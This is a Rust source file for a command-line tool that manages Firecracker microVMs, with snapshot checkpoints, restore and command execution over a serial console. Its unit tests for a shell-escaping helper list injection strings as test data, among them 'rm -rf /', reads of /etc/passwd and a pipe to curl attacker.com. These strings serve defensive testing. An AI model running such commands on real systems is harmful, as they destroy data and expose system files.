mod cli;
mod config;
mod console;
mod db;
mod storage;
mod vm;

use anyhow::Result;
use clap::Parser;

use cli::{Cli, Command, ConfigAction};
use config::Config;
use db::Db;

fn main() -> Result<()> {
    let cli = Cli::parse();

    match cli.command {
        Command::Config { action } => match action {
            ConfigAction::Set { key, value } => Config::set(&key, &value)?,
        },
        Command::Create {
            name,
            kernel,
            rootfs,
            cpus,
            mem,
        } => {
            let config = Config::load()?;
            let kernel = config.resolve_kernel(kernel.as_deref())?;
            let rootfs = config.resolve_rootfs(rootfs.as_deref())?;
            let db = Db::open()?;
            vm::create_vm(&name, &kernel, &rootfs, cpus, mem, &db)?;
        }
        Command::Destroy { name } => {
            let db = Db::open()?;
            vm::destroy_vm(&name, &db)?;
        }
        Command::List => {
            let db = Db::open()?;
            vm::list_vms(&db)?;
        }
        Command::Console { name } => {
            let db = Db::open()?;
            let _rec = db
                .get_vm(&name)?
                .ok_or_else(|| anyhow::anyhow!("VM '{name}' not found"))?;
            console::attach_console(&name)?;
        }
        Command::Checkpoint { name, label } => {
            let db = Db::open()?;
            let rec = db
                .get_vm(&name)?
                .ok_or_else(|| anyhow::anyhow!("VM '{name}' not found"))?;

            let checkpoint_id = uuid::Uuid::new_v4().to_string()[..8].to_string();

            println!("Pausing VM '{name}'...");
            vm::pause_vm(&rec.socket_path)?;

            println!("Creating Firecracker snapshot...");
            let subvol = storage::vm_subvolume_path(&name);
            vm::create_fc_snapshot(&rec.socket_path, &subvol)?;

            println!("Creating snapshot...");
            let snap_path = storage::create_snapshot(&name, &checkpoint_id)?;

            println!("Resuming VM '{name}'...");
            vm::resume_vm(&rec.socket_path)?;

            db.insert_checkpoint(
                &checkpoint_id,
                &name,
                label.as_deref(),
                &snap_path.to_string_lossy(),
            )?;

            println!(
                "Checkpoint '{checkpoint_id}' created{}",
                label
                    .as_ref()
                    .map(|l| format!(" (label: {l})"))
                    .unwrap_or_default()
            );
        }
        Command::Checkpoints { name } => {
            let db = Db::open()?;
            let checkpoints = db.list_checkpoints(&name)?;
            if checkpoints.is_empty() {
                println!("No checkpoints for VM '{name}'.");
                return Ok(());
            }

            use tabled::{Table, Tabled};

            #[derive(Tabled)]
            struct CpRow {
                id: String,
                label: String,
                created: String,
            }

            let rows: Vec<CpRow> = checkpoints
                .iter()
                .map(|cp| CpRow {
                    id: cp.id.clone(),
                    label: cp.label.clone().unwrap_or("-".into()),
                    created: cp.created_at.clone(),
                })
                .collect();

            let table = Table::new(rows).to_string();
            println!("{table}");
        }
        Command::Restore {
            name,
            checkpoint_id,
            new_name,
        } => {
            let db = Db::open()?;
            let checkpoint = db
                .get_checkpoint(&checkpoint_id)?
                .ok_or_else(|| anyhow::anyhow!("checkpoint '{checkpoint_id}' not found"))?;

            let target_name = new_name.as_deref().unwrap_or(&name);

            if new_name.is_some() {
                println!("Cloning checkpoint to '{target_name}'...");
                storage::clone_snapshot(&checkpoint.snapshot_path, target_name)?;
            } else {
                println!("Destroying current VM '{name}' for in-place restore...");
                vm::destroy_vm(&name, &db)?;
                println!("Cloning checkpoint to '{target_name}'...");
                storage::clone_snapshot(&checkpoint.snapshot_path, target_name)?;
            }

            println!("Spawning Firecracker process...");
            let (pid, socket_path) = vm::spawn_fc_for_restore(target_name)?;

            println!("Loading snapshot...");
            let snap_dir = storage::vm_subvolume_path(target_name);
            vm::load_fc_snapshot(&socket_path, &snap_dir)?;

            let orig_vm = db.get_vm(&checkpoint.vm_name)?;
            let (kernel, rootfs_path, cpus, mem) = if let Some(ref orig) = orig_vm {
                (
                    orig.kernel.clone(),
                    orig.rootfs.clone(),
                    orig.cpus,
                    orig.mem_mib,
                )
            } else {
                let config = Config::load()?;
                (
                    config.resolve_kernel(None).unwrap_or_default(),
                    snap_dir.join("rootfs.ext4").to_string_lossy().to_string(),
                    1,
                    256,
                )
            };

            db.insert_vm(
                target_name,
                db::VmInsertData {
                    pid,
                    socket_path,
                    kernel,
                    rootfs: rootfs_path,
                    cpus,
                    mem_mib: mem,
                },
            )?;

            println!("VM '{target_name}' restored from checkpoint '{checkpoint_id}'");
        }
        Command::Exec { name, command } => {
            if command.is_empty() {
                anyhow::bail!("no command specified");
            }
            let db = Db::open()?;
            let _rec = db
                .get_vm(&name)?
                .ok_or_else(|| anyhow::anyhow!("VM '{name}' not found"))?;

            exec_via_serial(&name, &command)?;
        }
    }

    Ok(())
}

/// Escape a string for safe use in a shell command.
/// Uses single quotes and escapes any single quotes in the string.
fn shell_escape(s: &str) -> String {
    if s.is_empty() {
        return "''".to_string();
    }

    // If the string contains no special characters, return as-is
    if s.chars()
        .all(|c| c.is_alphanumeric() || c == '_' || c == '-' || c == '.' || c == '/')
    {
        return s.to_string();
    }

    // Otherwise, wrap in single quotes and escape any single quotes
    format!("'{}'", s.replace('\'', "'\\''"))
}

/// Execute a command inside a VM by writing to the serial console and
/// reading the output from serial.log.
///
/// Uses a unique marker to delimit command output from other serial noise.
#[cfg(test)]
mod tests {
    use super::*;

    #[test]
    fn shell_escape_empty_string() {
        assert_eq!(shell_escape(""), "''");
    }

    #[test]
    fn shell_escape_safe_strings_unchanged() {
        assert_eq!(shell_escape("hello"), "hello");
        assert_eq!(shell_escape("foo_bar"), "foo_bar");
        assert_eq!(shell_escape("file.txt"), "file.txt");
        assert_eq!(shell_escape("/usr/bin/ls"), "/usr/bin/ls");
        assert_eq!(shell_escape("a-b"), "a-b");
    }

    #[test]
    fn shell_escape_wraps_special_chars() {
        assert_eq!(shell_escape("hello world"), "'hello world'");
        assert_eq!(shell_escape("a;b"), "'a;b'");
        assert_eq!(shell_escape("$(cmd)"), "'$(cmd)'");
        assert_eq!(shell_escape("a|b"), "'a|b'");
        assert_eq!(shell_escape("`cmd`"), "'`cmd`'");
        assert_eq!(shell_escape("a&b"), "'a&b'");
        assert_eq!(shell_escape("a>b"), "'a>b'");
    }

    #[test]
    fn shell_escape_handles_single_quotes() {
        assert_eq!(shell_escape("it's"), "'it'\\''s'");
        assert_eq!(shell_escape("'"), "''\\'''");
    }

    #[test]
    fn shell_escape_injection_attempts() {
        // These should all be safely escaped
        let dangerous = [
            "; rm -rf /",
            "$(cat /etc/passwd)",
            "`cat /etc/passwd`",
            "| curl attacker.com",
            "&& echo pwned",
            "'; DROP TABLE vms; --",
        ];
        for input in dangerous {
            let escaped = shell_escape(input);
            // All dangerous inputs contain special chars, so they must be single-quoted
            assert!(escaped.starts_with('\''), "should be quoted: {input}");
            assert!(escaped.ends_with('\''), "should be quoted: {input}");
        }
    }
}

fn exec_via_serial(vm_name: &str, command: &[String]) -> Result<()> {
    let serial_path = vm::serial_log_path(vm_name);
    if !serial_path.exists() {
        anyhow::bail!("serial.log not found for VM '{vm_name}' — is it running?");
    }

    // Record the current end of serial.log so we only capture new output
    let start_pos = std::fs::metadata(&serial_path)?.len();

    let marker_start = format!("NOID_EXEC_{}", &uuid::Uuid::new_v4().to_string()[..8]);
    let marker_end = format!("{marker_start}_END");

    // Build command with proper shell escaping to prevent command injection
    let escaped_cmd = command
        .iter()
        .map(|arg| shell_escape(arg))
        .collect::<Vec<_>>()
        .join(" ");

    // Send command wrapped in echo markers so we can parse the output
    let wrapped = format!("echo '{marker_start}'; {escaped_cmd}; echo '{marker_end}'\n");
    vm::write_to_serial(vm_name, wrapped.as_bytes())?;

    // Poll serial.log for the end marker
    let timeout = std::time::Duration::from_secs(30);
    let start = std::time::Instant::now();

    loop {
        if start.elapsed() > timeout {
            anyhow::bail!("exec timed out after 30s waiting for command to complete");
        }

        std::thread::sleep(std::time::Duration::from_millis(100));

        let content = std::fs::read_to_string(&serial_path)?;
        if content.len() as u64 <= start_pos {
            continue;
        }
        // Safe conversion: we checked that start_pos <= content.len()
        let start_offset = start_pos.min(content.len() as u64) as usize;
        let new_output = &content[start_offset..];

        // Look for markers on their own lines (not in the echoed command).
        // Serial console uses \r\n line endings.
        let start_needle = format!("\r\n{marker_start}\r\n");
        let end_needle = format!("\r\n{marker_end}\r\n");

        if let Some(end_pos) = new_output.find(&end_needle) {
            if let Some(start_pos) = new_output.find(&start_needle) {
                let output_start = start_pos + start_needle.len();
                if output_start <= end_pos {
                    let output = &new_output[output_start..end_pos];
                    let output = output.trim();
                    if !output.is_empty() {
                        println!("{output}");
                    }
                }
            }
            return Ok(());
        }
    }
}
